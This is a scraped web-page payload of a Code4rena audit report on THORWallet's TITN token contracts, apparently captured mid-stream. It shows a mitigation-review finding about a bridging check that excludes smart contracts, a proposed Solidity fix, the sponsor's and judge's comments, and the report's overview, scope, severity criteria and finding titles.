13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-8\"\u003eF-9 Unmitigated\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-8\"\u003eweb3km\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-5\"\u003eshaflow2\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eSeverity: High\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 id=\"vulnerability-details-1\" style=\"position:relative;\"\u003e\u003ca href=\"#vulnerability-details-1\" aria-label=\"vulnerability details 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eVulnerability details\u003c/h3\u003e\n\u003cp\u003eThe TITN protocol recently fixed a problem where users could get around transfer limits by bridging tokens between different chains.\u003c/p\u003e\n\u003cp\u003eTo stop this, a new check was added in _send to make sure that the receiver on the other chain is the same as the msg.sender on the current chain.\u003c/p\u003e\n\u003cp\u003eThis fix works, but it also creates a new problem: smart contracts can no longer use the bridge.\u003c/p\u003e\n\u003ch3 id=\"impact\" style=\"position:relative;\"\u003e\u003ca href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eUnlike regular wallets (EOAs), smart contracts usually don’t have the same address on different chains. Because of this, they can’t pass the new check and can’t bridge tokens.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eTo fix this while still keeping transfers safe, consider using the same rules from _validateTransfer instead of requiring the sender and receiver to have the same address.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"21\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e- require(_sendParam.to == bytes32(uint256(uint160(msg.sender))), \u0026quot;Must bridge to your own address\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+ if (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       isBridgedTokensTransferLocked \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       (isBridgedTokenHolder[_from] || block.chainid == arbitrumChainId)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   ) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       revert BridgedTokensTransferLocked();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"links-to-affected-code\" style=\"position:relative;\"\u003e\u003ca href=\"#links-to-affected-code\" aria-label=\"links to affected code permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eLinks to affected code\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/THORWallet/TGT-TITN-merge-contracts/blob/8b65b79609b819a5420ad783b642b284efa7d6fb/contracts/Titn.sol#L120\"\u003eTitn.sol#L120\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-8?commentParent=ARLr286sawG\"\u003ecacaomatt (THORWallet) commented\u003c/a\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eValid finding, we’ll implement the suggested update.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-8?commentParent=DQhUPSqQaZg\"\u003e0xnev (judge) commented\u003c/a\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eI am accepting this as a new submission per discussions and comments noted \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-5?commentParent=hcgcqmrecZc\u0026#x26;commentChild=i6C7J44nVPf\"\u003ehere\u003c/a\u003e. \u003c/p\u003e\n\u003cp\u003eListing as mitigated as sponsor acknowledges this as design decision and will accept only EOAs for bridging during lockup period. This fix will likely be performed on the UI as mentioned.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch1 id=\"disclosures\" style=\"position:relative;\"\u003e\u003ca href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eDisclosures\u003c/h1\u003e\n\u003cp\u003eC4 is an open organization governed by participants in the community.\u003c/p\u003e\n\u003cp\u003eC4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\u003c/p\u003e\n\u003cp\u003eC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\u003c/p\u003e\n\u003cstyle class=\"grvsc-styles\"\u003e\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line \u003e * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting \u003e .grvsc-code \u003e .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk6 { color: #D7BA7D; }\n  .dark-default-dark .mtk14 { color: #F44747; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n\u003c/style\u003e"])</script><script>self.__next_f.push([1,"16:T975,"])</script><script>self.__next_f.push([1,"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#overview\"\u003eOverview\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#about-c4\"\u003eAbout C4\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#summary\"\u003eSummary\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#scope\"\u003eScope\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#severity-criteria\"\u003eSeverity Criteria\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#high-risk-findings-2\"\u003eHigh Risk Findings (2)\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#h-1-mergetgt-has-no-handling-if-tgttoexchange-is-exceeded-during-the-exchange-period\"\u003e[H-1] MergeTgt has no handling if TGT\u003cem\u003eTO\u003c/em\u003eEXCHANGE is exceeded during the exchange period\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#h-2-the-user-can-send-tokens-to-any-address-by-using-two-bridge-transfers-even-when-transfers-are-restricted\"\u003e[H-2] The user can send tokens to any address by using two bridge transfers, even when transfers are restricted.\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#medium-risk-findings-1\"\u003eMedium Risk Findings (1)\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#m-1-improper-transfer-restrictions-on-non-bridged-tokens-due-to-boolean-bridged-token-tracking-allowing-a-dos-attack-vector\"\u003e[M-1] Improper Transfer Restrictions on Non-Bridged Tokens Due to Boolean Bridged Token Tracking, Allowing a DoS Attack Vector\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#low-risk-and-non-critical-issues\"\u003eLow Risk and Non-Critical Issues\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#qa-01-dust-amount-loss-in-cross-chain-titn-token-transfers\"\u003eQA-01 Dust Amount Loss in Cross-Chain TITN Token Transfers\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#qa-02-interface-documentation-references-wrong-token-standard\"\u003eQA-02 Interface Documentation References Wrong Token Standard\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#qa-03-use-of-non-standard-erc-677-token-interface\"\u003eQA-03 Use of Non-Standard ERC-677 Token Interface\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#qa-04-setter-functions-dont-check-for-value-changes\"\u003eQA-04 Setter Functions Don’t Check for Value Changes\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#qa-05-permanent-transfer-restrictions-on-bridged-tokens-due-to-immutable-isbridgedtokenholder-mapping\"\u003eQA-05 Permanent transfer restrictions on bridged tokens due to immutable isBridgedTokenHolder mapping\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#mitigation-review\"\u003eMitigation Review\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#mitigation-review-scope\"\u003eMitigation Review Scope\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#mitigation-review-summary\"\u003eMitigation Review Summary\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#f-9-unmitigated\"\u003eF-9 Unmitigated\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#disclosures\"\u003eDisclosures\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e"])</script><script>self.__next_f.push([1,"19:T302de,"])</script><script>self.__next_f.push([1,"\u003ch1 id=\"overview\" style=\"position:relative;\"\u003e\u003ca href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eOverview\u003c/h1\u003e\n\u003ch2 id=\"about-c4\" style=\"position:relative;\"\u003e\u003ca href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eAbout C4\u003c/h2\u003e\n\u003cp\u003eCode4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.\u003c/p\u003e\n\u003cp\u003eA C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\u003c/p\u003e\n\u003cp\u003eDuring the audit outlined in this document, C4 conducted an analysis of the THORWallet smart contract system. The audit took place from February 20, 2025 to February 26, 2025.\u003c/p\u003e\n\u003cp\u003eThis audit was judged by \u003ca href=\"https://code4rena.com/@0xnev\"\u003e0xnev\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eFinal report assembled by Code4rena.\u003c/p\u003e\n\u003cp\u003eFollowing the C4 audit, 3 wardens (\u003ca href=\"https://code4rena.com/@shaflow2\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/@web3km\"\u003eweb3km\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/@kn0t\"\u003ekn0t\u003c/a\u003e) reviewed the mitigations for all identified issues; the \u003ca href=\"#mitigation-review\"\u003emitigation review report\u003c/a\u003e is appended below the audit report.\u003c/p\u003e\n\u003ch1 id=\"summary\" style=\"position:relative;\"\u003e\u003ca href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSummary\u003c/h1\u003e\n\u003cp\u003eThe C4 analysis yielded an aggregated total of 3 unique vulnerabilities. Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity and 1 received a risk rating in the category of MEDIUM severity.\u003c/p\u003e\n\u003cp\u003eAdditionally, C4 analysis included 9 reports detailing issues with a risk rating of LOW severity or non-critical. \u003c/p\u003e\n\u003cp\u003eAll of the issues presented here are linked back to their original finding.\u003c/p\u003e\n\u003ch1 id=\"scope\" style=\"position:relative;\"\u003e\u003ca href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eScope\u003c/h1\u003e\n\u003cp\u003eThe code under review can be found within the \u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet\"\u003eC4 THORWallet repository\u003c/a\u003e, and is composed of 2 smart contracts written in the Solidity programming language and includes 216 lines of Solidity code.\u003c/p\u003e\n\u003ch1 id=\"severity-criteria\" style=\"position:relative;\"\u003e\u003ca href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSeverity Criteria\u003c/h1\u003e\n\u003cp\u003eC4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.\u003c/p\u003e\n\u003cp\u003eHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMalicious Input Handling\u003c/li\u003e\n\u003cli\u003eEscalation of privileges\u003c/li\u003e\n\u003cli\u003eArithmetic\u003c/li\u003e\n\u003cli\u003eGas use\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eFor more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on \u003ca href=\"https://code4rena.com\"\u003ethe C4 website\u003c/a\u003e, specifically our section on \u003ca href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\"\u003eSeverity Categorization\u003c/a\u003e.\u003c/p\u003e\n\u003ch1 id=\"high-risk-findings-2\" style=\"position:relative;\"\u003e\u003ca href=\"#high-risk-findings-2\" aria-label=\"high risk findings 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eHigh Risk Findings (2)\u003c/h1\u003e\n\u003ch2 id=\"h-1-mergetgt-has-no-handling-if-tgttoexchange-is-exceeded-during-the-exchange-period\" style=\"position:relative;\"\u003e\u003ca href=\"#h-1-mergetgt-has-no-handling-if-tgttoexchange-is-exceeded-during-the-exchange-period\" aria-label=\"h 1 mergetgt has no handling if tgttoexchange is exceeded during the exchange period permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-6\"\u003e[H-1] MergeTgt has no handling if TGT\u003cem\u003eTO\u003c/em\u003eEXCHANGE is exceeded during the exchange period\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-171\"\u003ejsonDoge\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-88\"\u003e0x41head\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-87\"\u003e0xAsen\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-146\"\u003e0xastronatey\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-473\"\u003e0xbrett8571\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-218\"\u003e0xd4ps\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-379\"\u003e0xgh0stcybers3c\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-61\"\u003e0xGondar\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-269\"\u003e0xLeveler\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-789\"\u003e0xlucky\u003c/a\u003e, \u003ca 